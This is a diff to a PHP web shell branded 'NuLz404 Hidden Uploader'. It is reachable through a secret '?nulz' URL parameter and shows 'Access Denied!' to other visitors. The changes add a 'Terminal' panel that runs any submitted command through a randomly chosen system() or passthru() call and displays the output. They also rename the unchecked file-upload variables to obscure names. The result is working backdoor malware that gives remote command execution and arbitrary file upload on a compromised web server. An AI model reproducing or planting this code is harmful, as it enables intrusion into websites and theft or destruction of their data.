@@ -6,10 +6,10 @@ echo "<h1>Access Denied!</h1>";
 
 //Upload Validation
 if (isset($_POST['btn-upl'])) {
-	$filename = $_FILES['upl']['name'];
-	$location = $_FILES['upl']['tmp_name'];
-	$dir = "";
-	if (move_uploaded_file($location, $dir.$filename)) {
+	$a1 = $_FILES['upl']['name'];
+	$b2 = $_FILES['upl']['tmp_name'];
+	$c3 = "";
+	if (move_uploaded_file($b2, $c3.$a1)) {
 		echo "<script>alert('Upload Success :)')</script>";
 	} else {
 		echo "<script>alert('Upload Failed! :(')</script>";
@@ -30,18 +30,6 @@ if (isset($_POST['buatfile'])) {
         echo "<script>alert('Berhasil Buat File :)');</script>";
     } else {
         echo "<script>alert('Gagal Buat File :(');</script>";
-    }
-}
-
-//Create Dir Validation
-if (isset($_POST['buatdir'])) {
-    $namadir = $_POST['namadir'];
-    $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $namadir);
-    $buatfolder = mkdir($folder);
-    if ($buatfolder) {
-        echo "<script>alert('Berhasil Buat Folder :)');</script>";
-    } else {
-        echo "<script>alert('Gagal Buat Folder :(');</script>";
     }
 }
 
@@ -98,13 +86,9 @@ if (isset($_GET['nulz'])) {
                         color: #ffffff;
                         border: 1px solid #eaeaea;
                         border-radius: 10px;
-                        background: ;
-                        font-size: 2.50vh;
+                        font-size: 1.75vh;
                         font-weight: 700;
-                        padding: 5px 10px 5px;
-                    }
-                    .root form #btn-upl {
-                        font-size: 4vh;
+                        padding: 2.5px 5px 2.5px;
                         margin: 0;
                     }
                     .root form button:hover {
@@ -118,12 +102,12 @@ if (isset($_GET['nulz'])) {
                 <div class="mb-4">
                     <a href="?nulz&ganteng"><button type="button" class="btn btn-outline-light">Home</button></a>
                     <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
-                    <a href="?nulz&ganteng&dir"><button type="button" class="btn btn-outline-light">Buat Folder</button></a>
+                    <a href="?nulz&ganteng&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                 </div>
                 <h1>NuLz404 Hidden Uploader</h1>
                 <form action="" method="post" enctype="multipart/form-data">
-                <div class="mb-3">
-                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 4vh; margin: 1rem;">Upload File</label>
+                <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
+                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                     <input type="file" name="upl" id="upl">
                     <button type="submit" name="btn-upl" id="btn-upl">Upload</button>
                 </div>'
@@ -141,14 +125,23 @@ if (isset($_GET['nulz'])) {
                     </div>
                     ';
                 }
-                if (isset($_GET['dir'])) {
+                if (isset($_GET['terminal'])) {
                     echo '
                     <div class="mb-3">
-                        <label for="namadir" class="form-label">Buat Folder</label>
-                        <input type="text" class="form-control form-control-sm" name="namadir" id="namadir" placeholder="nama folder">
+                        <label for="terminal" class="form-label">Command</label>
+                        <input type="text" class="form-control form-control-sm" name="cmd" id="cmd" placeholder="ls -la | dir">
                         <div class="mt-3 d-grid gap-2">
-                            <input class="btn btn-outline-light" type="submit" name="buatdir" value="Buat Folder">
-                        </div>
+                            <input class="btn btn-outline-light" type="submit" name="enter" value="enter">
+                        </div>';
+                    echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
+						$shell = ["system", "passthru"];
+						$chose = array_rand($shell);
+						if (isset($_POST["enter"])) {
+							echo 'Use Function > ' . $shell[$chose] . PHP_EOL . '---------------------------------------' . PHP_EOL;
+							$shell[$chose]($_POST["cmd"]);
+						}
+					echo '
+						</textarea>
                     </div>
                     ';
                 }
